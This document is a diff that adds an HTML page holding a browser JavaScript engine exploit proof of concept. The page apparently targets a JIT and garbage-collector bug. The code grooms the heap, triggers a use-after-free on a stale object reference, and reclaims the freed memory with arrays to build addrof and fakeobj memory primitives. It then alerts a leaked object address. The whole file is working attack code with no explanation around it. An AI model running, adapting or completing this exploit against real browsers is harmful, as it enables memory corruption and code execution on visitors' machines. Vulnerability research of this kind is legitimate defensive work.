@@ -1,0 +1,125 @@
+<script>
+arr = new Array(0x40_0000).fill(1.1);
+let arr_index = arr.length - 1;
+let reclaimed = [];
+
+function foo(flag, k, allocCount) {
+    let A = {
+        p0: 0x41414141,
+        p1: 1.1,
+        p2: 2.2,
+    };
+    arr[arr_index] = A;
+
+    let forGC = [];
+
+    let a = new Date(1111);
+    a[0] = 1.1;
+
+    for (let j = 0; j < allocCount; ++j) {
+        let arr = new ArrayBuffer(0x80_0000);
+        forGC.push(arr);
+    }
+
+    A.p2 = forGC;
+    let b = {
+        p0: 0x42424242,
+        p1: 1.1,
+    };
+
+    let f;
+    f = b;
+    if (flag) {
+        f = 1.1;
+    }
+
+    A.p1 = f;
+    let v = 1.1;
+    for (let i = 0; i < 1e6; ++i) {
+        for (let j = 0; j < k; ++j) {
+            v = i;
+            v = j;
+        }
+    }
+    b.p0 = v;
+    b.p1 = a;
+}
+
+function recursive(n) {
+    if (n === 0)
+        return;
+    n = n | 0;
+    recursive(n - 1);
+}
+
+function main() {
+    foo(true, 1, 1);
+    foo(false, 1, 1);
+
+    for (let i = 0; i < 1000; ++i) {
+        foo(false, 0, 0);
+    }
+
+    for (let i = 0; i < 10000; i++)
+        recursive(i);
+
+
+    for (let k = 0; k < 10000; ++k) {
+        foo(false, 10, k % 5 + 1);
+        recursive(10000);
+
+        for (let i = 0; i < 3; ++i) {
+            new ArrayBuffer(0x4000);
+        }
+
+        let freed = arr[arr_index].p1.p1;
+        let noCow = 13.37;
+        let win = false;
+        for (let i = 0; i < 16; ++i) {
+            let arr = [13.37, 2.2, 3.3, 4.4, noCow]; 
+            reclaimed.push(arr);
+            if (freed[0] === 13.37) { 
+                win = true;
+                break;
+            }
+        }
+
+        if (!win) {
+            continue;
+        }
+
+        let boxed_arr = reclaimed[reclaimed.length - 1];
+        boxed_arr[0] = {};
+        let unboxed_arr = freed;
+
+        let ab = new ArrayBuffer(8);
+        let u64 = new BigUint64Array(ab);
+        let f64 = new Float64Array(ab);
+
+        function itof(value) {
+            u64[0] = value;
+            return f64[0];
+        }
+
+        function ftoi(f) {
+            f64[0] = f;
+            return u64[0];
+        }
+
+        function addrof(obj) {
+            boxed_arr[0] = obj;
+            return ftoi(unboxed_arr[0]);
+        }
+
+        function fakeobj(addr) {
+            unboxed_arr[0] = itof(addr);
+            return boxed_arr[0];
+        }
+
+        alert(`0x${addrof({ p0: 1.1 }).toString(16)}`);
+        break;
+    }
+    alert('end');
+}
+main();
+</script>
